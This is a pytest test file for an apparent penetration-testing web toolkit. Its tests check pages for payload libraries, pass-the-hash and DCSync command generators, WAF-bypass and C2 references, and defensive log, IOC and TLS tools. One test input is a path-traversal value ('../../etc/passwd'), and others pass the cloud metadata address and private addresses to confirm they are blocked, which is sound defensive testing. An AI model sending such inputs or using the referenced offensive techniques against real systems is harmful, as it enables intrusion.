        bad = [t["slug"] for t in self.tools if t.get("tier") not in valid_tiers]
        assert bad == [], f"Invalid tier values on: {bad}"

    def test_every_section_has_at_least_one_field(self):
        bad = []
        for tool in self.tools:
            for section in tool.get("sections", []):
                if not section.get("fields"):
                    bad.append(f"{tool['slug']}:{section.get('id', '?')}")
        assert bad == [], f"Sections with no fields: {bad}"

    def test_preset_values_reference_valid_field_ids(self):
        """Preset keys must correspond to field ids defined in the tool's sections."""
        bad = []
        for tool in self.tools:
            field_ids = {
                f["id"]
                for section in tool.get("sections", [])
                for f in section.get("fields", [])
            }
            for preset in tool.get("presets", []):
                for key in preset.get("vals", {}).keys():
                    if key not in field_ids:
                        bad.append(f"{tool['slug']}/{preset.get('label','?')}: unknown field '{key}'")
        assert bad == [], f"Preset references unknown fields:\n" + "\n".join(bad[:10])


# ═══════════════════════════════════════════════════════════════════════════════
# INSTALL HINTS
# ═══════════════════════════════════════════════════════════════════════════════

class TestInstallHints:

    def test_install_map_covers_all_tools(self):
        from zip_analyzer.tool_data import TOOLS, get_install
        missing = [t["slug"] for t in TOOLS if get_install(t["slug"]) is None]
        assert missing == [], f"Tools without install hints: {missing}"

    def test_all_install_methods_have_meta(self):
        from zip_analyzer.tool_data import INSTALL_MAP, INSTALL_METHOD_META
        used = {m for v in INSTALL_MAP.values() for m in v}
        undefined = used - set(INSTALL_METHOD_META)
        assert undefined == set(), f"Methods without display metadata: {undefined}"

    def test_get_install_returns_dict_for_known_tool(self):
        from zip_analyzer.tool_data import get_install
        result = get_install("nmap")
        assert isinstance(result, dict)
        assert "brew" in result

    def test_get_install_returns_none_for_unknown(self):
        from zip_analyzer.tool_data import get_install
        assert get_install("not-a-real-tool-slug") is None

    def test_builtin_tools_have_builtin_key(self):
        from zip_analyzer.tool_data import get_install
        for slug in ("grep", "find", "awk", "sed", "nc", "tar", "ps"):
            hints = get_install(slug)
            assert hints is not None and "builtin" in hints, \
                f"{slug} should have 'builtin' key"

    def test_go_tools_have_valid_go_commands(self):
        from zip_analyzer.tool_data import INSTALL_MAP
        for slug, hints in INSTALL_MAP.items():
            if "go" in hints:
                assert hints["go"].startswith("go install "), \
                    f"{slug} go command should start with 'go install'"

    def test_pip_tools_have_valid_pip_commands(self):
        from zip_analyzer.tool_data import INSTALL_MAP
        for slug, hints in INSTALL_MAP.items():
            if "pip" in hints:
                assert hints["pip"].startswith("pip install "), \
                    f"{slug} pip command should start with 'pip install'"

    def test_brew_tools_have_valid_brew_commands(self):
        from zip_analyzer.tool_data import INSTALL_MAP
        for slug, hints in INSTALL_MAP.items():
            if "brew" in hints:
                assert hints["brew"].startswith("brew install "), \
                    f"{slug} brew command should start with 'brew install'"

    def test_tool_page_shows_install_block_when_hints_exist(self, client):
        r = client.get("/generators/nmap")
        assert r.status_code == 200
        assert b"install-block" in r.data
        assert b"brew install nmap" in r.data

    def test_tool_page_shows_all_install_methods(self, client):
        """sqlmap has brew + apt + pip — all three must appear."""
        r = client.get("/generators/sqlmap")
        assert b"brew install sqlmap" in r.data
        assert b"apt install" in r.data
        assert b"pip install sqlmap" in r.data

    def test_builtin_tool_shows_builtin_note(self, client):
        r = client.get("/generators/grep")
        assert b"Built into" in r.data
        assert b"install-builtin" in r.data

    def test_tool_page_passes_install_meta(self, client):
        r = client.get("/generators/nmap")
        assert b"Homebrew" in r.data

    def test_tool_page_no_install_block_when_no_hints(self, client):
        """A tool without install hints must not render the install block."""
        from zip_analyzer.tool_data import TOOLS, get_install
        # Find a tool with no hints (shouldn't exist now, but future-proofs the test)
        no_hint = next((t["slug"] for t in TOOLS if get_install(t["slug"]) is None), None)
        if no_hint:
            r = client.get(f"/generators/{no_hint}")
            assert b"install-block" not in r.data


# ─────────────────────────────────────────────────────────────────────────────
# Phase 12 — Network Security Tools
# ─────────────────────────────────────────────────────────────────────────────

class TestNetworkSecurityTools:
    """iptables, hping3, nft are in tool_data and have valid definitions."""

    NEW_TOOLS = ["iptables", "hping3", "nft"]

    def test_new_tools_exist_in_tool_data(self):
        from zip_analyzer.tool_data import get_tool
        for slug in self.NEW_TOOLS:
            t = get_tool(slug)
            assert t is not None, f"{slug} missing from tool_data"

    def test_new_tools_have_correct_category(self):
        from zip_analyzer.tool_data import get_tool
        for slug in self.NEW_TOOLS:
            t = get_tool(slug)
            assert t["category"] == "Network", f"{slug} should be in Network category"

    def test_new_tools_have_presets(self):
        from zip_analyzer.tool_data import get_tool
        for slug in self.NEW_TOOLS:
            t = get_tool(slug)
            assert len(t.get("presets", [])) >= 3, f"{slug} needs at least 3 presets"

    def test_new_tools_have_install_hints(self):
        from zip_analyzer.tool_data import get_install
        for slug in self.NEW_TOOLS:
            hints = get_install(slug)
            assert hints is not None, f"{slug} missing from INSTALL_MAP"

    def test_iptables_generator_page_loads(self, client):
        r = client.get("/generators/iptables")
        assert r.status_code == 200
        assert b"iptables" in r.data

    def test_hping3_generator_page_loads(self, client):
        r = client.get("/generators/hping3")
        assert r.status_code == 200
        assert b"hping3" in r.data

    def test_nft_generator_page_loads(self, client):
        r = client.get("/generators/nft")
        assert r.status_code == 200
        assert b"nft" in r.data

    def test_iptables_page_shows_install_hints(self, client):
        r = client.get("/generators/iptables")
        assert b"install-block" in r.data

    def test_hping3_page_shows_brew_hint(self, client):
        r = client.get("/generators/hping3")
        assert b"brew install hping" in r.data

    def test_iptables_in_all_tools_list(self):
        from zip_analyzer.tool_data import get_all_tools
        slugs = [t["slug"] for t in get_all_tools()]
        assert "iptables" in slugs
        assert "hping3" in slugs
        assert "nft" in slugs

    def test_network_category_count_increased(self):
        from zip_analyzer.tool_data import get_all_tools
        network_tools = [t for t in get_all_tools() if t["category"] == "Network"]
        # Was 4 (nc, socat, tcpdump, tshark) + 3 new = 7 minimum
        assert len(network_tools) >= 7

    def test_tool_count_increased(self):
        from zip_analyzer.tool_data import get_all_tools
        assert len(get_all_tools()) >= 166  # was 163


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 12b — Network Security Wing (builder tools + protocol reference)
# ═══════════════════════════════════════════════════════════════════════════════

class TestPhase12bPages:
    """Netfilter builder, IDS rule builder, Scapy crafter, and protocol reference pages."""

    def test_netfilter_page_loads(self, client):
        r = client.get("/tools/netfilter")
        assert r.status_code == 200
        assert b"netfilter" in r.data.lower() or b"filter" in r.data.lower()

    def test_netfilter_has_bpf_output(self, client):
        r = client.get("/tools/netfilter")
        assert b"bpf" in r.data.lower() or b"tcpdump" in r.data.lower()

    def test_netfilter_has_wireshark_output(self, client):
        r = client.get("/tools/netfilter")
        assert b"wireshark" in r.data.lower()

    def test_ids_rule_page_loads(self, client):
        r = client.get("/tools/ids-rule")
        assert r.status_code == 200

    def test_ids_rule_has_suricata(self, client):
        r = client.get("/tools/ids-rule")
        assert b"suricata" in r.data.lower() or b"snort" in r.data.lower()

    def test_ids_rule_has_action_field(self, client):
        r = client.get("/tools/ids-rule")
        assert b"alert" in r.data.lower() or b"action" in r.data.lower()

    def test_scapy_page_loads(self, client):
        r = client.get("/tools/scapy")
        assert r.status_code == 200

    def test_scapy_has_python_snippet(self, client):
        r = client.get("/tools/scapy")
        assert b"scapy" in r.data.lower()
        assert b"python" in r.data.lower() or b"from scapy" in r.data.lower()

    def test_protocols_page_loads(self, client):
        r = client.get("/reference/protocols")
        assert r.status_code == 200

    def test_protocols_page_has_content(self, client):
        r = client.get("/reference/protocols")
        assert b"tcp" in r.data.lower()
        assert b"dns" in r.data.lower()

    def test_protocols_data_module_imports(self):
        from zip_analyzer.protocol_data import PROTOCOLS, CATEGORIES
        assert len(PROTOCOLS) >= 30
        assert len(CATEGORIES) >= 5

    def test_protocols_have_required_fields(self):
        from zip_analyzer.protocol_data import PROTOCOLS
        required = {"name", "full", "layer", "category", "desc", "attacks", "tools"}
        for p in PROTOCOLS:
            missing = required - p.keys()
            assert not missing, f"{p['name']} missing fields: {missing}"

    def test_protocols_attacks_are_lists(self):
        from zip_analyzer.protocol_data import PROTOCOLS
        for p in PROTOCOLS:
            assert isinstance(p["attacks"], list), f"{p['name']}.attacks must be a list"
            assert len(p["attacks"]) >= 1, f"{p['name']} needs at least 1 attack vector"

    def test_protocols_tools_are_lists(self):
        from zip_analyzer.protocol_data import PROTOCOLS
        for p in PROTOCOLS:
            assert isinstance(p["tools"], list), f"{p['name']}.tools must be a list"


# ═══════════════════════════════════════════════════════════════════════════════
# JWT DECODER / SUBNET CALC / PAYLOAD LIBRARY
# ═══════════════════════════════════════════════════════════════════════════════

class TestJwtTool:
    def test_page_loads(self, client):
        r = client.get("/tools/jwt")
        assert r.status_code == 200

    def test_has_decode_ui(self, client):
        r = client.get("/tools/jwt")
        assert b"decode" in r.data.lower() or b"jwt" in r.data.lower()

    def test_flags_alg_none(self, client):
        r = client.get("/tools/jwt")
        assert b"alg" in r.data.lower() or b"none" in r.data.lower()

    def test_shows_cracking_hint(self, client):
        r = client.get("/tools/jwt")
        assert b"hashcat" in r.data.lower() or b"crack" in r.data.lower()


class TestSubnetTool:
    def test_page_loads(self, client):
        r = client.get("/tools/subnet")
        assert r.status_code == 200

    def test_has_cidr_input(self, client):
        r = client.get("/tools/subnet")
        assert b"cidr" in r.data.lower() or b"subnet" in r.data.lower()

    def test_shows_network_fields(self, client):
        r = client.get("/tools/subnet")
        assert b"network" in r.data.lower()
        assert b"broadcast" in r.data.lower()

    def test_has_presets(self, client):
        r = client.get("/tools/subnet")
        assert b"192.168" in r.data or b"10.0" in r.data


class TestPayloadsTool:
    def test_page_loads(self, client):
        r = client.get("/tools/payloads")
        assert r.status_code == 200

    def test_has_xss_category(self, client):
        r = client.get("/tools/payloads")
        assert b"xss" in r.data.lower()

    def test_has_sqli_category(self, client):
        r = client.get("/tools/payloads")
        assert b"sql" in r.data.lower()

    def test_has_rce_or_lfi(self, client):
        r = client.get("/tools/payloads")
        assert b"rce" in r.data.lower() or b"lfi" in r.data.lower()

    def test_payloads_are_copyable(self, client):
        r = client.get("/tools/payloads")
        assert b"copy" in r.data.lower()


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 13 — OFFENSIVE TOOLING
# ═══════════════════════════════════════════════════════════════════════════════

class TestAdAuthTool:
    def test_page_loads(self, client):
        r = client.get("/generators/ad-auth")
        assert r.status_code == 200

    def test_has_pth_section(self, client):
        r = client.get("/generators/ad-auth")
        assert b"pass-the-hash" in r.data.lower() or b"pth" in r.data.lower()

    def test_has_ticket_section(self, client):
        r = client.get("/generators/ad-auth")
        assert b"ticket" in r.data.lower() or b"kerberos" in r.data.lower()

    def test_has_netexec_or_impacket(self, client):
        r = client.get("/generators/ad-auth")
        assert b"netexec" in r.data.lower() or b"impacket" in r.data.lower()

    def test_has_dcsync(self, client):
        r = client.get("/generators/ad-auth")
        assert b"dcsync" in r.data.lower() or b"secretsdump" in r.data.lower()

    def test_has_copy_buttons(self, client):
        r = client.get("/generators/ad-auth")
        assert b"copy" in r.data.lower()


class TestWafBypassReference:
    def test_page_loads(self, client):
        r = client.get("/reference/waf-bypass")
        assert r.status_code == 200

    def test_has_sqli_bypasses(self, client):
        r = client.get("/reference/waf-bypass")
        assert b"sql" in r.data.lower()

    def test_has_xss_bypasses(self, client):
        r = client.get("/reference/waf-bypass")
        assert b"xss" in r.data.lower()

    def test_has_encoding_techniques(self, client):
        r = client.get("/reference/waf-bypass")
        assert b"encod" in r.data.lower() or b"bypass" in r.data.lower()

    def test_has_copy_or_search(self, client):
        r = client.get("/reference/waf-bypass")
        assert b"copy" in r.data.lower() or b"search" in r.data.lower()


class TestC2Reference:
    def test_page_loads(self, client):
        r = client.get("/reference/c2")
        assert r.status_code == 200

    def test_has_cobalt_strike(self, client):
        r = client.get("/reference/c2")
        assert b"cobalt" in r.data.lower()

    def test_has_sliver(self, client):
        r = client.get("/reference/c2")
        assert b"sliver" in r.data.lower()

    def test_has_metasploit(self, client):
        r = client.get("/reference/c2")
        assert b"metasploit" in r.data.lower() or b"msfconsole" in r.data.lower()

    def test_has_opsec_notes(self, client):
        r = client.get("/reference/c2")
        assert b"opsec" in r.data.lower() or b"sleep" in r.data.lower()

    def test_has_malleable_or_profile(self, client):
        r = client.get("/reference/c2")
        assert b"malleable" in r.data.lower() or b"profile" in r.data.lower()


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 14 — DEFENSIVE TOOLING
# ═══════════════════════════════════════════════════════════════════════════════

class TestLogParseTool:
    def test_page_loads(self, client):
        r = client.get("/tools/logparse")
        assert r.status_code == 200

    def test_has_paste_area(self, client):
        r = client.get("/tools/logparse")
        assert b"paste" in r.data.lower() or b"textarea" in r.data.lower()

    def test_has_log_format_options(self, client):
        r = client.get("/tools/logparse")
        assert b"apache" in r.data.lower() or b"nginx" in r.data.lower()

    def test_has_auth_log_option(self, client):
        r = client.get("/tools/logparse")
        assert b"auth" in r.data.lower() or b"syslog" in r.data.lower()

    def test_highlights_scanners(self, client):
        r = client.get("/tools/logparse")
        assert b"scan" in r.data.lower() or b"nikto" in r.data.lower() or b"sqlmap" in r.data.lower()


class TestIocTool:
    def test_page_loads(self, client):
        r = client.get("/tools/ioc")
        assert r.status_code == 200

    def test_has_defang_section(self, client):
        r = client.get("/tools/ioc")
        assert b"defang" in r.data.lower()

    def test_has_extractor(self, client):
        r = client.get("/tools/ioc")
        assert b"extract" in r.data.lower()

    def test_has_ip_domain_hash(self, client):
        r = client.get("/tools/ioc")
        text = r.data.lower()
        assert b"ip" in text and (b"domain" in text or b"hash" in text)

    def test_has_copy_buttons(self, client):
        r = client.get("/tools/ioc")
        assert b"copy" in r.data.lower()


class TestTlsTool:
    def test_page_loads(self, client):
        r = client.get("/tools/tls")
        assert r.status_code == 200

    def test_has_domain_input(self, client):
        r = client.get("/tools/tls")
        assert b"domain" in r.data.lower()

    def test_has_cert_fields(self, client):
        r = client.get("/tools/tls")
        text = r.data.lower()
        assert b"expire" in text or b"san" in text or b"issuer" in text

    def test_has_cipher_info(self, client):
        r = client.get("/tools/tls")
        assert b"cipher" in r.data.lower() or b"tls" in r.data.lower()


class TestTlsApi:
    def test_missing_domain_returns_400(self, client):
        r = client.get("/api/tls")
        assert r.status_code == 400

    def test_invalid_domain_returns_400(self, client):
        r = client.get("/api/tls?domain=../../etc/passwd")
        assert r.status_code == 400

    def test_invalid_domain_dotdot(self, client):
        r = client.get("/api/tls?domain=foo..bar")
        assert r.status_code == 400

    def test_valid_domain_attempts_connection(self, client, monkeypatch):
        import socket
        def fake_connect(addr, timeout=None):
            raise socket.timeout("mocked")
        monkeypatch.setattr(socket, "create_connection", fake_connect)
        r = client.get("/api/tls?domain=example.com")
        assert r.status_code == 504

    def test_returns_json(self, client, monkeypatch):
        import socket
        monkeypatch.setattr(socket, "create_connection", lambda *a, **kw: (_ for _ in ()).throw(OSError("mock")))
        r = client.get("/api/tls?domain=example.com")
        assert r.content_type.startswith("application/json")

    def test_localhost_blocked(self, client):
        r = client.get("/api/tls?domain=localhost")
        assert r.status_code == 400

    def test_loopback_ip_blocked(self, client):
        r = client.get("/api/tls?domain=127.0.0.1")
        assert r.status_code == 400

    def test_rfc1918_blocked(self, client):
        r = client.get("/api/tls?domain=192.168.1.1")
        assert r.status_code == 400

    def test_metadata_endpoint_blocked(self, client):
        r = client.get("/api/tls?domain=169.254.169.254")
        assert r.status_code == 400

    def test_link_local_blocked(self, client):
        r = client.get("/api/tls?domain=172.16.0.1")
        assert r.status_code == 400


# ── Phase 15: Platform Intelligence ───────────────────────────────────────────

class TestEngagementDashboard:
    def test_page_loads(self, client):
        r = client.get("/engagement")
        assert r.status_code == 200

    def test_has_dashboard_title(self, client):
        r = client.get("/engagement")
        assert b"Engagement Dashboard" in r.data or b"engagement" in r.data.lower()

    def test_has_stat_cards(self, client):
        r = client.get("/engagement")
        assert b"stat-card" in r.data or b"Total Scans" in r.data or b"Engagements" in r.data

    def test_has_playbook_link(self, client):
        r = client.get("/engagement")
        assert b"/playbook" in r.data

    def test_has_search_link(self, client):
        r = client.get("/engagement")
        assert b"/search" in r.data

    def test_empty_state_shown_with_no_engagements(self, client):
        r = client.get("/engagement")
        assert r.status_code == 200

    def test_active_page_marker(self, client):
        r = client.get("/engagement")
        assert b'active_page' not in r.data or b'engagement' in r.data


class TestGlobalSearch:
    def test_page_loads(self, client):
        r = client.get("/search")
        assert r.status_code == 200

    def test_has_search_input(self, client):
        r = client.get("/search")
        assert b"search-input" in r.data or b'type="text"' in r.data

    def test_has_api_search_call(self, client):
        r = client.get("/search")
        assert b"/api/search" in r.data

    def test_has_result_types_referenced(self, client):
        r = client.get("/search")
        assert b"tool" in r.data and b"port" in r.data


class TestSearchApi:
    def test_short_query_rejected(self, client):
        r = client.get("/api/search?q=a")
        assert r.status_code == 400
        assert b"error" in r.data

    def test_empty_query_rejected(self, client):
        r = client.get("/api/search?q=")
        assert r.status_code == 400

    def test_valid_query_returns_json(self, client):
        r = client.get("/api/search?q=nmap")
        assert r.status_code == 200
        data = r.get_json()
        assert "results" in data
        assert "count" in data
        assert "q" in data

    def test_query_echoed_back(self, client):
        r = client.get("/api/search?q=nmap")
        data = r.get_json()
        assert data["q"] == "nmap"

    def test_tool_search_returns_tools(self, client):
        r = client.get("/api/search?q=nmap")
        data = r.get_json()
        tools = [x for x in data["results"] if x["type"] == "tool"]
        assert len(tools) > 0

    def test_port_search_returns_port(self, client):
        r = client.get("/api/search?q=443")
        data = r.get_json()
        ports = [x for x in data["results"] if x["type"] == "port"]
        assert len(ports) > 0

    def test_result_has_required_fields(self, client):
        r = client.get("/api/search?q=nmap")
        data = r.get_json()
        for item in data["results"]:
            assert "type" in item
            assert "title" in item
            assert "url" in item

    def test_max_results_capped(self, client):
        r = client.get("/api/search?q=s")
        assert r.status_code == 400

    def test_long_query_truncated_not_error(self, client):
        q = "a" * 300
        r = client.get("/api/search?q=" + q)
        assert r.status_code in (200, 400)

    def test_protocol_search(self, client):
        r = client.get("/api/search?q=http")
        data = r.get_json()
        protocols = [x for x in data["results"] if x["type"] == "protocol"]
        assert len(protocols) > 0
